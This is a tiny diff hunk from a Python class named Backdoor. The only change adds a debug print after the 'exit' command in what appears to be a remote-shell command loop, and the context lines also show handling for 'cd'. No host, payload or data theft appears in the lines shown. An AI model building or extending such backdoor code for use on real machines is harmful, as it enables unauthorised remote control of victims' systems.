@@ -84,6 +84,7 @@ class Backdoor:
 				if command == "exit":
 					self.reliable_send("")
 					self.connected = False
+					print(self.connected)
 
 				elif command.split()[0] == "cd":
 					path = command.replace("cd", "").strip()
